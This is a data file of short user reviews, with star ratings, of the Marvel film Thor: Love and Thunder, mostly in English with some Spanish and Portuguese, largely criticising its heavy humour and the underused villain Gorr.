"I don't get the negativity surrounding this film. I thought it was a great comic book movie that oozed fun and adventure. Comics can be deep and serious, but often they're filled with silly and entertaining hijinks. Loved it and saw it twice.",5
I grew up reading Thor comics. What I saw on the screen has nothing to do with the character I grew up reading. This franchised has been ruined for Thor fans.,0.5
they wasted thor's character what a shame to watch gorr the god buther getting beaten by kids üòÇ,2
"Funny and Beautiful, every location is jaw dropping and colorful, and the cgi is great and used in a productive way. Its space so of course marvel will make it bright and colorful. Which really ties well with Gorr's dark and monotone colors. However what this film lacks is juice, meat, that real stuff. Thor has lost everyone and in this movie is now having his friends slaughtered. How is he Okay? How is this film not more serious? This movie should have taken a different approach and shown the tragedies Thor has been dealing with instead of just making him into a comedian. With that being said Goor should have more screen time and dialogue. Probably one of the best villains the MCU has seen yet he was under utilized and wasted on this comedy movie. This movie could've been a 10/10 if Thor was taken more serious and treated like what he is, a God, and if Gorr's mission had a longer and more real affect on Thor and the audience. 7/10 would watch again because it was funny and visually stunning. (P.S. i also really hated the goats but did love Thors humor overall just wished they saved Gorr for a more serious Thor movie.)",3
"When I first saw the movie, I thought it was ok. Then I saw it again like a week or two after the first viewing, but with my nephew, and I enjoyed it a little more. I THEN saw it a third time on Disney + with my nieces and didn't like it. Also I am baffled on how this has a higher score than ANTMAN 3.",2.5
"Buena, tiene un ritmo muy bueno, comedia/chistes/alivios c√≥micos pasables (parece que es humor para ni√±os) el villano es incre√≠ble, llego a entender sus razones, su arco est√° excelente, actuaci√≥n muy buena, CGI y efectos visuales y especiales maravillosos aunque la trama es algo predecible, pero hay 3 cosas malas: 1. Los Dioses, estos son una est√∫pides 2. H√©rcules como villano (sus motivaciones ser√≠a que atravesaron a su padre aunque este sigue con vida y que quieren a Thor por ser h√©roe y.... ya) 3. La pelea final de los ni√±os, no me emocion√≥ en lo absoluto pero la pelea de Thor y Jaine vs Goor si es buena.",4.5
It was a lot of bad jokes and less combat,1
A fun movie but not a particularly good one. Doesn't do much for the character of Thor or his future in the MCU.,3
The movie is very boring and not funny and the cgi is verdammt bad.,2.5
Excellent movie üòÑüëå,5
Marvel needs to recapture their brilliance. Love the people who made this movie. And I enjoyed it. But misses the dazzle of Ragnarok.,3.5
I loved Thor Ragnarok but this felt boring. Christian Bale was barely in the movie and Thor felt like a joke.,2
"Having watched most Marvel films this film stays in the same course nothing new and nothing surprising as forced humor is there and charismatic characters as there, like most marvel films. Having said that maybe it's the CGI that's improved as I enjoy this film for what it is a fun friendly Disney marvel film. Out of all the thor films I watch this is my second favorite behind the original.",4
filme tosco e infelizmente Thor se tornou uma piada . A introdu√ß√£o da menina foi muito boa para o futuro da marvel . O vil√£o perder para crian√ßas √© um desrespeito com o personagem,2
"Overall the movie's biggest strengths happened when it started taking itself seriously. Unfortunately, I felt like I had to suffer through the first half of the movie to get there. The goofy, almost cartoonish, dialogue that filled the first half of the movie couldn't hide the apparent lack of story or clumsy editing. Instead, the creators felt more interested in undoing all that had taken place in the last few MCU movies rather than telling a compelling story. However, once the status quo had been reestablished, the movie took off with genuine feelings of fear (Gor was easily the best part of the movie), sadness, happiness and heart... I can't recommend it if you hated the humor in Thor: Ragnarok...",2.5
Really? Thor: Love and Thunder is one of the worst Marvel movies of all time!,2.5
"Meh, screaming goats, this movie doesn't take itself seriously which can sometimes work but doesn't feel like it works, there are some serious issues in this movie, and they treat them all like jokes, Gor was underused",3
Extremely disappointing. Expectations were high off of Ragnarok. Usually I revisit Marvel movies once they come on streaming but I have had ZERO urge to revisit this one. Really the only positive I can say is Christian Bale's performance.,2
"Worst Thor film, just pointless jokes after jokes.",1.5
"Plot was fast paced and full of holes. Wayyy to comedic, made a mockery of characters. Ruined Jane's character...and Thor's.",0.5
"Not sure why everyone drags on this one. The fourth solo Thor outing is full of humor and heart. Taika gets this character more than anyone, and there are scenes that are absolutely devastating and more that will have you rolling with laughter. There are also so many nods to Marvel lore, connecting the cosmos, The Eternals, Moon Knight and the multiverse. I mean, we actually meet Eternity here. Also, two fight scenes in this movie are among the most creative and eye popping that's I've seen in the MCU. Particularly, the black and white planet with the shadow monsters, it was freaking stunning to see. Christian Bale looked like he had a blast playing Gorr the God Butcher. I'd say the only real let down is we didn't get to see more of him ""butchering"" and being a real villain. I heard a lot was left on the cutting floor to make this movie more palatable after Multiverse of Madness. Here's hoping for the edgier cut to be released one day.",5
What the heck happened to the superhero movies Marvel put out 5 years ago!! This phase 4 was HORRENDOUS!!,0.5
"A silly, unfunny comedy!",1
This movie just isn't good some much in here is played for laughs when at the heart of this movie the loses of thor aren't taken seriously and the pain of a love one having cancer isn't explored to well or even with any ounce of maturity. We're told there's good gods in this universe as well but other then thor we never see them making you root more for the villain then the heros trying to save other gods that truly felt more villainous. Also the child kidnapping just felt unnecessary in the long run.,1
"Bad effects, meet Taika Waititi's special humour, but are countered by Christian Bale's incredible acting skills.",2.5
"Thor: Love and Thunder is a top notch comedy film. If you're looking for a fun 2hrs to turn off your brain and have a laugh, this movie is absolutely perfect. However I can't promise it has the emotional maturity some fans seem to want.",5
"Why and how was this mandated to run less than two hours??? You can feel an epic and hilarious cut off this that would be legendary. Both epic-ness and comedy need time to breathe in order to really work, especially the mix of comedy and pathos that Taika was going for here. I've never seen marvel sabotage their own film to this degree. Is this hopefully part of why the Disney CEO was fired? Anyway it's still a fun and interesting movie. It would great to get amultiversal director's cut.",3.5
This aged like bad milk.,0.5
"""Thor: Love and Thunder"" picks up where the previous film, ""Thor: Ragnarok,"" left off. Thor is living in New Asgard and struggling to come to terms with his new reality as the God of Thunder. Meanwhile, Jane Foster, Thor's ex-girlfriend, is battling cancer on Earth. When Jane is infected by the Aether, an ancient weapon that has the power to destroy the universe, Thor must team up with the Guardians of the Galaxy to save her and stop the powerful villain, Gorr the God Butcher. The plot of ""Thor: Love and Thunder"" is an entertaining mix of action, humor, and emotion. The film's storyline is not overly complicated, making it easy to follow and enjoy. The film's focus on the relationship between Thor and Jane Foster adds a layer of emotional depth to the story, making the audience invested in the characters' well-being. The film's cast does a great job bringing their characters to life. Chris Hemsworth's portrayal of Thor is as charming and funny as ever, but also shows a more vulnerable side to the character. Natalie Portman's return as Jane Foster is a welcome addition, and her performance is both convincing and emotional. Tessa Thompson as Valkyrie continues to shine, delivering a performance that is both powerful and humorous. Christian Bale as Gorr the God Butcher is a great addition to the cast, delivering a menacing and powerful performance. The cinematography in ""Thor: Love and Thunder"" is fantastic. The film's action scenes are shot with great precision and are visually stunning. The special effects are top-notch, making the film's action sequences all the more thrilling. The film's use of colors and lighting also adds to its overall visual appeal. However some viewers may find the humor and tone of the film to be too over-the-top and distracting from the more serious moments of the story. Additionally, the film's pacing could be criticized as it tries to balance multiple storylines and characters, leading to some moments feeling rushed or underdeveloped. Finally, some viewers may find the reliance on CGI-heavy action sequences to be too excessive and lacking in the practical, grounded action that made some of the earlier MCU films so popular. Taika Waititi returns as the director of ""Thor: Love and Thunder"" and once again proves that he is a master at combining humor and action. Waititi's direction is spot-on, creating a film that is both entertaining and emotionally engaging. The film's pacing is also well-done, with the action scenes seamlessly integrated into the story. The film's score, composed by Mark Mothersbaugh, is a great addition to the movie. The music helps to enhance the emotional moments of the film while also adding to the excitement of the action scenes. Overall, ""Thor: Love and Thunder"" is a fun and entertaining addition to the Marvel Cinematic Universe. The film's mix of action, humor, and emotion makes it an enjoyable ride from start to finish. The film's performances, cinematography, direction, and music all work together to create a cohesive and enjoyable movie experience. If you're a fan of the Marvel Cinematic Universe, ""Thor: Love and Thunder"" is definitely worth checking out.",3.5
A tone murderer. Completely wasted Christian Bales character. They couldn't decide if they wanted to be serious or not throughout the movie and it just killed any sort of emotional investment. It was hard for me to appreciate it as there was no way to understand the tones for the scenes at all. Very poorly directed.,2
"Thor Dark World was for me, the worst Marcel movie‚Ä¶‚Ä¶until this one. It is funny that Thor Ragnarok is one of the best Marvel movies but TL&T is average at best. It has a few moments but feels out of balance. It is okay, but not up to the standards set by the better Marvel movies.",2.5
"Not a great movie. Some jokes seem a bit dumb and the story was sort of jumbled, but it did have some good moments.",2
Need more gorr butchering gods and to be more of a threat. Thor was never in danger.,3
I found myself very disappointed.,2.5
I love Taika Waititi however this isn't his best work. Comedy is forced in every minute of the film. It's like another director tried to copy Thor: Ragnarok. Christian Bale did great for the very little he was given. The film needed to lean more into darker tones considering the villain is a god butcher.,2
No thanks. It took numerous attempts to finish this one. Story and editing was a complete mess. Trying too hard to be a comedy.,1.5
The entire movie felt like a funny joke but it wasn't funny. And it made Thor feel weak,1
"6/10. Too many jokes. Ruins Thor's flawless character arc which spanned across 3 MOVIES. Has some pacing issues, villain was pretty good but not good enough to save the movie. Only enjoyable if u wanna turn off your brain and watch Thor beat up CGI goons. The ending was very ""out of nowhere"" and felt random. Overall the movie looks really good and has a really nice colour pallet.",3
Love love love this film 10/10,5
Please stop Taika Waititi....,0.5
"Confusing and boring. Thor Ragnarok was one of my favorite Marvel movies. This rendition was sappy, long winded and hard to follow.",1.5
Not good i would not recommend to anybody unless your under the age of 3. The writers fell asleep when writing this it feels like the jokes were pulled strait from twitter. They WASTED gore and Christian bale. This movie almost made me give up on the MSU it was so MID. The plot is okay at best the best part in the middle made me feel nothing. The jokes are so poorly written that my theater was quite. I don't know how you go from thor ragnorock to this. DO NOT WATCH. THE MCU IS FALLING BELOW MID.,2
Christian Bale was just wasted. shame,0.5
Really ClownThor the worse marvel movie this movie it is a joke,0.5
Rid√≠cula y molesta al intentar forzar la comedia en vez de una buena trama,0.5
I don't even know where to begin. A major disappointment.,1.5
"O filme √© divertido, por√©m poderia ser mais s√©rio.",5
"Muito arrastado, cansativo e for√ßado, filme pastel√£o. Que pena, estava com altas expectativas!!",0.5
"Not the best, not the worse‚Ä¶",3.5
"Thor used to be one of my favorite superheroes. But after watching Thor: Love and Thunder it ruined my view on Thor. This movie makes Thor look like a goofy hero who doesn't think about the consequences. Thor jokes around the entire movie, and some are funny but most is not. The story is good but is wasted. The villain isn't taken seriously and disrespects the comics and source material.",2.5
I loved this movie. Whoever gave it a 64% needs a sense of humor. I laughed my whole way through this. Way better than some 98% rated boring movie.,4.5
Not even close to the original Thor movies.,2
Christian Bale was the only bright spot in this ridiculously stupid movie. The creators of this movie should be embarrassed.,0.5
"Lacking the coherence and consistency of Ragnarok, Waititi's vision remains uncompromised in Thor's surprisingly darker fourth outing which demands to be seen again and again!",4
"Fun ride, now time to see what thor will do next. Good ending? For jane.",4.5
The worst Thor's movie ever,1
Not sure what they were thinking with the story of this move. Just pretty bad to be honest and doesn't even compare to what we got in Ragnarok.,1.5
"Like the title says, this film is about love, rediscovering it, understanding it, coming to terms with it, using it as an excuse to things too far, and to find purpose in life. It's a very subtle message, but it's there.",4
"It was a good movie. But there's so much wrong about this film like the fact that it's a rom-com. It shouldn't be a comedy with someone as dark as Gorr as it's villian. The movie felt too short. They definitely could've expanded the runtime by adding sequences of Gorr killing Gods since it really lacks that considering that Gorr's is literally called ""The God Butcher"". It was very strange and made zero sense for Mjolnir and Strombreaker to have feelings. And Gorr should've lived for at least one more movie. Christian Bale's performance was too good but unfortunately he didn't get as much screentime as he deserved. Overall, it's a solid, fun movie. But that's the problem, it should've been more serious. If that's not a problem, you will certainly enjoy Thor: Love and Thunder.",3.5
You flipped too hard goddamn it üòÇ,5
"Christian Bale is superb as usual and completely in a different movie. The CGI was just stupid (note: keep it realistic or at least probable, even though its fantasy sci-fi). The 'set' does not look really, if your going to use the great new studio, again, still make it believable. This is a low point for Marvel, worst than The Eternals, basically because Thor is such a good character and had such a great arc. Thor now seems pointless and amazingly he can do things that would have been quite useful in previous movies...he must have done some pretty good CPD courses this year. And stop with the jokes. Jokes joke joke STOP. Children were kidnapped by a God butcher! Light relief is good, silly joke overkill is not good. I hope Taika is now finished with making Marvel movies as all the ideas were really stupid. I hope the use of Hercules in the future is not in a movie like this. As a huge marvel fan, i felt that I needed to enjoy and appreciate every movie and tv show, but I just cannot anymore. When it's bad, you just have to admit it's bad.",2
Could've done better.,2.5
"While it's adapted from two Thor stories that carry a lot of emotional and thematic weight, Love and Thunder opts to face grief with a wry smile on its face. The film is bookended by narration from comic relief Korg, which is something to remember as the story unfolds- Bale's Gorr, for example, endures a massive tonal shift from his tragic prologue to when Korg takes over story telling duties, from living up to his God Butcher moniker to creepy boogeyman child snatcher. Still, it doesn't exactly shy away from a counter religious theme and it looks like a living comic book. To see the story from a different perspective would be intriguing, but like Taika Watiti's earlier work it deals with dark themes with the lightness of touch that isn't out of place in a Saturday morning cartoon.",3
??? too much bland comedy and too little drama unfortunately. too shameful,1.5
"Every other sentence was a senseless joke, the stupid goats, Christian Bale had so much potential, the orgy reference‚Ä¶ and the stupid goats. Such a disappointing addition to the MCU",0.5
"On first watch-through I was entertained by this movie, but it ultimately was a let down. There was so much potential that just fizzled out. I was so excited for the films to finally use the Grod and Mighty Thor comic arcs, but it felt like both were mishandled. Grod could have been awesome, but was just kind of muddled through with confusing intent. And to have Jane's arc end like that seemed like a letdown. It seemed like lazy storytelling. Also, Thor having a charge is cute, but I hope they recast movie forward‚Ä¶his daughter is not an actress. Also, why do they keep teasing us about giving Valkyrie the queer love she deserves? Get with it Marvel! Overall, I'm ready for the upcoming movies to start working towards a common goal, like previous phases, and I think the standalone nature of this movie made the issues feel worse. I still love Thor though, but I do miss the depth his character gained in Ragnarok and utilized in both Avengers films.",3
"More like a comedy, colourful was still there, but the fun & jokes are over.. Thor lost its personality, while valkyrie lost its character as well.. the return of Jane & new faces of Gor was a waste, dint act much, and dint show the true deep character of themselves..",3
"The movie is alright, sadly, a God Butcher really only kills one God, the opening scene was absolutely great, but it kind of fell hard after that, Lady Thor aka Jane Foster was a cute an a solid character, loved the small tidbits of humour, Zeus an Valkyrie are great also, people say its too much ""humor"" but it was fine, as an adult comic book fan, i understand how Thor uses comedic quips to mask his loneliness of loss, the movie does hit Thor hard emotionally, an i get it, unfortunately Gorr the God Butcher is in the wrong film as they should of waited to make a Multiversal Thor film, an have Gorr face 3 Thors or something, C+ rating, you can skip this film in the MCU bingewatch.",2.5
i actually f'ng love these comedic thor movies. taika does it for me. thor 1&2 were good but ragnarok and love&thunder are elite. yes they're stupid movies. but there're stupid marvel movies. and that's the point. i really liked gorr he was awesome.,4
This one was worse than Thor: Dark World...This installment took what worked and was funny in Thor: Ragnarok and took it WAAAAY too far....Story was just not that good and way too cheesy for the most part. Best parts of the movie: Christian Bale's character and the screaming goats!!,2.5
Thor Love and Thunder is my favourite MCU movie.,5
"Though not as good as Thor: Ragnarok, this is definitely the 2nd best Thor film. I personally really liked the villain and the humor incorporated in the movie. What I really appreciated and enjoyed about this film was the cinematography. Some scenes were made so ridiculously good. It was up there for me with Dr. Strange 2 and MCU Spider-Man 3, possibly higher. In terms of story, it wasn't as good as those two.",4.5
Another disappointment of mcu. Ok to watch. But not recommended.,2
"This is by far the worst installment of Thor. He has gone from lovable oblivious ignorance to just dumb and a buffoon. It's not funny how dumb they have made the character. Most characters have growth and gain knowledge, this one has a learning disability, dementia or both.",1.5
Definitely a fun movie with a lot of comedy thats good but they went too far and made all the characters more of jokes and made the film a little bit of a let down.,2.5
"I enjoyed this movie, it was entertaining and a nice change of pace at the time.",3
90 second best marvel movie,4.5
Could be better but Thor ragnarok is a tough act to follow.,3
"Mala, aburrida y con chistes sin gracia.",1
"Meh, para ver un rato est√° bien, pero no es lo mejor",3
Worst mcu movie in my opinion. This movie was a cringe fest.,1
"Me gust√≥ la pel√≠cula, un desarrollo de personaje genial, el villano le falt√≥ un poco m√°s de desarrollo",4
"I get why many don't like this, but I find it very enjoyable.",4
Somebody needed to kill those goats,2
"Great effects and action scenes, but the drama and plot of the movie has all been taken away from unnecessary comedy",4
Weakest movie of the Thor saga.,1.5
"If i could give a 0 for this movie i would do it, it is the most ridiculus movie that i have ever see.",0.5
"lowkey mid. but i kind of liked it. would probably not rewatch. the zeus and ""low-level vs high-level god"" part kinda made like no sense and i had trouble keeping with the overall plot. the ""eternity"" and bifrost as the key part was very silly, as the mcu already has a ""wish maker"" (the infinity stones) which made thanos' obsession with them completely redundant. made thor a total dumbass and nerfed him so hard bro. costumes were goofy too, the way thor's powers worked lowk backtracked on thor: ragnarok and infinity war and endgame. i really wanted to see him without stormbreaker or mjolnir again, like how he was in those movies!! (for brief moments ofc) natalie as jane and christian as gorr really helped this movie. loved gorr's story! thought he was a great villain. and jane was amazing. i thought her and thor's relationship (and the flashback) was well represented and i enjoyed how cute it was!",2
"Really great cast with Hemsworth, Portman and Bale and the result‚Ä¶. A funny movie with a great ending but lot's left on the table. It underperformed in my eyes because of how great Ragnorak is and the cast.",3.5
the mcu is dead. bury it,1.5
"I'll give them this- I was entertained for the duration of the film. However, I can't deny the fact that this was a little bit underwhelming. I felt like this was a time where Thor would be less cheerful or happy all the time(considering the dark depression we saw in Endgame), but we saw him crack jokes every 3 minutes. I enjoyed it- don't get me wrong, but some of the jokes were just put in the wrong spots. The plot was a little bit shaky sometimes, too. My favorite part was the screaming goats. I probably could have gone without the dark monster things, though.",3.5
Pretty standard MCU film‚Äîlots of action and humor.,3.5
G*y scene ruined all the movie actually,1.5
Cringe cringe and more cringe...,0.5
"As pessoas elevam o hype √°s alturas e claro que se decepcionaram. Eu gostei do filme porque diferente da maioria, n√£o esperei que fossem aparecer um personagem t√£o especial como o Loki, n√£o esperava nenhum aventura especifica e por isso n√£o me decepcionei, porque justamente eu n√£o esperava nada demais. A √∫nica coisa que tinha expectativa era na Jane, e o que me mostraram da Jane no filme foi incrivel. Adorei a hist√≥ria, as cores, a trilha sonora e os personagens. Achei que a Valkyria deveria aparecer mais, assim como o Korg, mas nunca pensei que fosse shippar tanto o Thor e a Jane. Foi uma hist√≥ria pequena do arco de hist√≥rias do Thor. As pessoas esperavam tanto do filme, ficam fazendo teoria da conspira√ß√£o e ainda ficam comparando com os quadrinhos, coisa que eu n√£o fiz por isso eu curti mais do filme do que a maioria.",4
This movie is a disappointment.,1.5
"This is a film that I really wanted to enjoy, in Ragnarok, Taika Waititi found the line between comedy and compelling storytelling, occasionally dipping a toe over the line but quickly retracting it, so I couldn't wait for what Waititi would do next. However, in this film, that cautiousness is gone, instead they blew up the line and paraded across it on a chariot pulled by screaming goats. In other words, the comedy is so constant and so unbelievably stupid that it's hard to enjoy the actual story that is going on. The villain is alright but is used in completely the wrong film, Christian Bale is, of course brilliant, but his character is such a dark, serious villain in a film that is so saturated and bright that it could hurt your eyes and is populated with sentient hammer love triangles and van damme kicks. In another film, Gorr could be brilliant, but not here.",1.5
"This would have to be the worst Marvel movie ever made. Tried wayyyy too hard to be funny and just came off as cringey. Christian Bale's character creation was great, but even he can only do so much with a terrible script",0.5
embarrassment to the mcu,2
"I believe Thor may need another film or twenty two after this to find himself. But finding oneself for over a decade IS DEFINITELY THE THING TO DO for a western male, especially if blonde or gingah. Another great adventure in the shadow of an independent, stunning and brave strongwoman! Best marvel movie since the last marvel movie! I just can't wait for the next product, I mean..uh..marvel movie...!!:D + F the c*nsorship on this site",5
"Yet another movie that takes no risks. This comic fan is displeased. Allblack the necrosword is dumbed down, gorr looks like a human and all that family friendly comedy makes me want to vomit.",0.5
To match comedy and no good of a story arc.,2
This is bad movies . Everything bad,1
A big rotten beffed up thor,0.5
"It was silly and ridiculous by the way. It wasn't fire as Ragnarok, but okay.",3
Great balance of drama vs humor. Good story. This was good!!,4
One of the worst super hero movie ever they ruined my favourite character pretty greatly good job for that vatiti,0.5
Movie sucked. New MCU sucks. Disney & Marvel are just creating filler/mids content with high budget cgi and production. As well as actors obviously. Still the story of this movie sucked. I fell asleep in the theater and so did my girlfriend. I honestly wanted my money back movie sucked that much real burn that I paid to sleep.,1
"This is classic Big Dumb Fun MCU movie, but also funny. I thought Waititi did a wonderful job (both voice acting and directing). Although this won't go down as one of the great movies of all time (I mean, seriously, it won't), it is absolutely a great superhero movie if you can stand a lot of silliness. The cameo appearances are wonderful, with my favorite being that by Russel Crowe. Matt Damon also does a pretty good turn (or two). So if you don't mind suspending disbelief and enjoying Space Vikings, enjoy! Plus, the Goat Boat!",4
Weakest Thor film since Thor 2. This film resets Thor‚Äôs amazing development through the Infinity saga and makes him a mockery of what he has become. This Thor has to be a variant because he is nowhere the same as the Infinity Saga Thor. Awesome to look at and Nataly knocks it out of the park. Christian Bale was embarrassingly underutilized. It‚Äôs a marvel film.,3
"It starts poorly, but soon it starts to impr... no it doesn't. The humour is over-done, repetitive and poor, the characters are underdeveloped and the script writing is of the kind of quality I managed in English class, when I was seven. Maybe Taika got a little intoxicated by his success and didn't think he needed to put any effort into this, but his comedic style turned this largely into a parody of himself.",2
"I really really enjoyed it, lots of humour and action. A big film like the avenger movies.",5
"Not as funny as it would clearly like to be, and saddled with some lackluster performances, Thor: Love and Thunder continues Marvel's trend of dipping quality in a post-Endgame world. Like the previous Thor entry it has a bit too much fun for the stakes that are presented, complicating the search for a proper tone. Christian Bale is Gorr the God Butcher, a once-pious man who lost everything while hanging on to his faith only to be told, by the very god that he worshipped, that his prayers and dedication amounted to nothing. Equipped with the All-Black Necrosword, Gorr makes a pledge that all gods will die. Bale is the only performance worth mentioning here, and like so many excellent superhero villains his screen time is too limited for a movie who's runtime is under two hours. Gorr's story and trajectory are very dark and clash with the absurd comedic theatrics of our heroes. The tone of Thor: Love and Thunder shows a diminishing return on these action/comedy superhero movies in a way that makes DC projects look admirable for the first time in years. As a whole package it's fine, but misses several of its marks and can't really decide how it wants its viewers to feel as the credits roll.",3
"I thought it was one of the best movies ever when I left the theater. But then when I rewatched it on Disney+, I was surprised at how bored I was.",3
Not a single American psycho reference. What a rip off,1
This is actually the worst movie I've ever seen. I'm convinced that Disney made this movie to test how bad of a movie they could make money on. The ammount of plot holes is ridiculous. And they weaponized kids!?!?! If I could rate this movie any lower than a 1 star I would. I feel like I've lost brain cells by watching it.,1
"Thor has taken a backseat after Ragnarok, he went from being fun and exciting and over the top and goofy to a superhero joke. I still enjoyed the film, and I'm not against Jane Foster, like everybody else, but I felt like she could have been noncomical, and Thor could've brought it down 100%. I want to see that exciting Thor with the original Thor, not this goofy, over-the-top, silly film franchise. I need superhero action with depth and storytelling, I need the focus to be on Thor and not what's next in the MCU .",3
One of the worst Marvel movies I‚Äôve ever seen. Awful. I‚Äôve watched many marvel movies many times but this is one I won‚Äôt even think about watching a second time.,1
"Why Taika waititi thinks Thor was dumb fellow. Thor doesn't knows anything. Thor was a moron. He's god of thunder he was living, fighting for 1000s of years. Russo brothers gives a decent character development to Thor in their movies, if Taika cames in he totally projects him as moron. Both flims of taika was like a dumb Horizontal over Saturated tik tok. He wasted ""Planet hulk"", ""Ragnarok"", ""Gorr"", ""Thor"" everything. Thor is still worthy for mjolnir not for the fourth film.",1
"I'm not sure why I didn't like this one as much. On paper, it seems to have everything you want from a Thor film with Waititi at the helm. However, it just felt like it failed to execute on the same level as Ragnorok. I enjoyed it, but I feel I'm not going to make an effort to rewatch it.",3
"Not anywhere near as good as the previous Thor movies. Thor acted a lot smarter in earlier movies. The movie went for a more perverted dialogue and theme. They tried to be funny, but it just didn't work this time.",1
"Enjoyed watching this. I felt like the potential with the villain was wasted, not enough depth. Overall a good watch though.",3.5
"Enjoyed it. Fun, Silly with some great action scenes",3.5
"The general idea is great, but the movie is quite childish, too many jokes and little to no serious moments, if it were to balance out, it might turn out better",1
At some point the jokes were simply not funny anymore and Thor looks a bit stupid.,3
Too much focus on beeing funny so the story was very very weak. The characters nearly hadnt any seriousness to them and therefor the whole story was ridiculous. A real shame what became of MCU since Stan Lee died.,0.5
"A sad turn for the character of Thor. Even though I mostly enjoyed the last one (Ragnarok), I was afraid of the direction they were taking this character. They've turned Thor into a complete joke, & don't get me wrong...I have no issue with poking fun/not taking things so seriously, but they've gone far beyond that with this. On top of that, it's ""girl boss"" porno, with Natalie Portman putting in a surprisingly uneven, & at times outright insufferable, performance.",2
"Para mim um f√£ da Marvel, Este filme foi uma tortura do come√ßo ao fim! Se a cada momento vergonha alheia, eu ganhace um d√≥lar eu ja teria ultrapassada bilheteria dele",1.5
This movie gets better and better with each re-watch... it makes me think of me and my little daughter. Love and thunder,5
Very disappointing. Marvel has gone down since Endgame and at this point they act like they don't even care. WAY to much comedy that isn't even funny. The only good Character was the Villian portrayed by the amazing Christian Bale but the whole movie felt like a bad spoof. What is marvel coming to? Do not recommend for marvel lovers or true fans of the MCU.,0.5
"Visually striking and has a great villain, but this is definitely a step back in the Thor films.",3
"There's a lot of CGI and very little plot and it's confusing and often spectacular but totally missable. I didn't love the film, it's visually marvelous with certain characters that worked and certain sequences were hilarious. The film has no structure and no plan and is often frustrating. All Marvel movies can't be winners! Final Score: 5.6/10",3
"It's baffling that the director who made Thor: Ragnorak made this. This movie doesn't have a good balance between humor and seriousness in the slightest. Either a scene is going to be extremely goofy where every sentence leaving a character's mouth is a joke, or it's going to be dark, gritty, and snapping animals' necks. The movie is too tonally inconsistent to ignore. I did enjoy Mighty Hammer's inventive use of Mjolnir.",2.5
This was really hard to watch. It was kind of boring. The story was just plain awful.,2
"Thor: Love and Thunder is a disappointing addition to the MCU. While Chris Hemsworth and Natalie Portman deliver somewhat solid performances, Tessa Thompson feels like she's phoning it in and the film overall lacks the proper energy and balanced humor of the previous Thor film directed by Taika Waititi. The story decisions are questionable and the comedic elements feel forced. Bale, although good, was wasted in a poorly written character. The effects are just okay. Overall, Thor: Love and Thunder is a frustrating misfire, the worst Thor film and one of the weakest entries in the MCU.",2
What a ü¶Ä sorry I refunded my money on this one too,1
The movie tried too hard to be funny. The few serious moments were poorly placed. The attempted humor via the romance with the axe missed the mark. Could not finish the movie and I am a big fan of the Marvel Universe.,0.5
"To much comedy, ragnarok at least has the comedy with the emotion",2
"Controversial opinion: The goats were the best part of this movie. [...possibly the closest thing to a ""good part"" as well.] My further opinions are too nerdy, but I didn't like this.",2
"It appears that disgraced asshat Bob Chapek (not going to link to IMDb for this asshat since his bio there is just corporate gibberish written by Disney themselves, and not updated to show that he got fired) has scared away any form of actual talent from Disney so that even when they do something that is not blatantly woke and preaching it still turns into a turd. Already in the first scenes I was going what the f‚Ä¶ is this? Are they turning the franchise into a comedy? Thor himself has been turned into a rambling moron. The rest of the Gods are either unbelievable assholes or fat slobs only caring about their orgies or some combination thereof. Most of the movie I was just cringing in my seat. If they were actually going for more of a comedy movie than an actual Thor movie they failed miserably. The ""jokes"" where unfunny, unintelligent and just bad. Superhero slapstick at best. The only character that I found remotely likable and cool in the movie was King Valkyrie. Jane Foster was not too bad either. The rest was just a joke. The portrayal of the mighty God Zeus and Olympus was an affront. The bad guy was not too bad although I would not call him likable of course. He is not supposed to be likable. At least he was not turned into a parody. It is really a shame because the underlying story is not half bad‚Ä¶ if it had been given to someone with actual talent to implement. It is predictable of course but it is okay. If it had only been given to someone who could have turned it into a real Thor movie instead of this failed comedy turd. I have to admit that I did not have my hopes up very much when starting to watch this movie. Given what Disney has turned into I was afraid that they were literally going to turn Thor into a female and luckily that did not happen. Unfortunately they found another way of ruining the franchise. This movie is nothing like the previous Thor movies. I really liked Thor: The Dark World for example. To me this movie is very close to a franchise killer. The one and a half stars is for the special effects. They were pretty good. The rest of this movie is really bad.",1.5
"The movie itself is very good, the only problem is that they spoiled Thor's best villain in this movie, and in the comics he is a real threat, in the movie he didn't seem so threatening",3.5
"A fun movie with some funny moments but overall it just makes a joke of Thor though I'm not gonna say it started with this, it went too far with endgame I think with bro Thor. Because THOR isn't a joke, he's an amazing character that has been wasted in the MCU, the acting was pretty bad as well. But that's just my opinion",2
They made Thor into an idiot. I miss Spike Lee. He would have never allowed the Marvel trash that is out now.,2
"I think the movie was meant to be comedic, but I was cringing the entire time. I couldn't take anything seriously even when it tried to be serious at random points. Thor has always had a comedic side to him, but never at the cost of his character. Plus we didn't get to see nearly enough of the villain who is called the ""god butcher"" and we didn't see him butchering any gods except at the beginning. Overall I really did not enjoy the movie and felt underwhelmed leaving the theater.",0.5
I think the story is good just too light and fluffy at times for Thor.,3
The only good aspect about this film is Chris Hemsworth. The rest of the film is simply generic and has been shown similarly many times before. Absolutely predictable and boring,1.5
The movie was far from being a movie about a god and more about stupid fun,0.5
Pretty good as far as Thor movies go. Funny lines to break up the muscles and special effects. There are sooo many of this genre it's hard to be excited about them any more.,3.5
"bad pacing, annoying characters, and telling too many bad jokes throughout the movie . All the characters were changed to fit Taika's vision. Thor became an annoying child in this movie, Korg is in this movie far more than he logically should be and Tessa Thompson's acting is still dogshit. The guardians have been turned into one dimensional bit parts for their scene. The only redeeming part of this movie is Jane since she had a great arc. Taika has fallen off the rails and it really shows.",1
"It's a kid movie, for this it works, but only",2.5
"1st time watching: great, 2nd time: good, 3rd time: annoying.",2.5
Barely a pass for falling short of expectation after the high standard set by the last one.,3
I literally liked the lighting effects.,5
It was so awful it offended me in a personal level.,0.5
"This was truly awful. I stopped watching halfway through. It's an absolute vacuum of content: a mind-numbing, lowest common denominator-ticking, sickly phlegm of a film that makes a tragedy out of trying to make comedy, and a bad comedy out of an action film. Are the people who write/direct these movies selected by a raffle?",1.5
"Unfortunately this was a poorly written and directed film. Completely missed the mark. Was hopeful after Ragnarok, but couldn't duplicate the magic.",2.5
"The few attempts at more interesting storytelling are lost in a true avalanche of jokes. While some of those jokes do land, the majority do not. The characters also have a bad habit of explicitly voicing over their thoughts and motivations that again cheapens the more interesting components.",1
some funny and entertaining but it should be more.,3
Absolutely fabulous. Marvel really went all out producing a academy awards; global globe awards nominee worthy film. Just a master piece. Chris Hemsworth really worked hard keeping his figure in shape. my praise goes to him and his family and all the other actors who participated in this film.,5
One of the weaker offerings from the Thor franchise. The humor was just out of hand. Zeus was ridiculous and the goats were absolutely annoying. Thor has become a sad joke at this point.,1.5
This is where franchises go to die.,1
